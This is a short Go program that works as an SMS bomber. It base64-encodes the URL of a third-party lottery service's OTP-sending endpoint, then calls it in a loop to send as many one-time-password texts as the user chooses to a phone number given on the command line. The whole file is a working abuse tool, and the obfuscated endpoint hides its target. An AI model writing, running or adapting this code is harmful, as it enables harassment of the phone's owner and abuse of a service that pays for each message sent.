package main

import (
    "encoding/base64"
    "fmt"
    "io/ioutil"
    "net/http"
    "os"
    "strconv"
)

func sendGetRequest(phoneNumber string, iterationCount int) {
    decodedUrl, _ := base64.StdEncoding.DecodeString("aHR0cHM6Ly9sb3R0ZXJ5LWFwaXMtenFta2tscDViYS1lbS5hLnJ1bi5hcHAvc2VuZE9UUC8/cGhvbmU9")
    fullUrl := fmt.Sprintf("%s%s", decodedUrl, phoneNumber)

    for i := 1; i <= iterationCount; i++ {
		fmt.Printf("Sending SMS %d\n", i)
		resp, err := http.Get(fullUrl)
        if err != nil {
            fmt.Println("Error:", err)
            return
        }
        defer resp.Body.Close()
        body, _ := ioutil.ReadAll(resp.Body)
        fmt.Println(string(body))
	}

    
}

func main() {
    if len(os.Args) != 3 {
        fmt.Println("Usage: go run script.go <phone_number> <iteration_count>")
        return
    }

    phoneNumber := os.Args[1]
    iterationCount, err := strconv.Atoi(os.Args[2])
	if err != nil {
		fmt.Println("Invalid iteration count. Please provide a valid number.")
		return
	}
    sendGetRequest(phoneNumber, iterationCount)
}
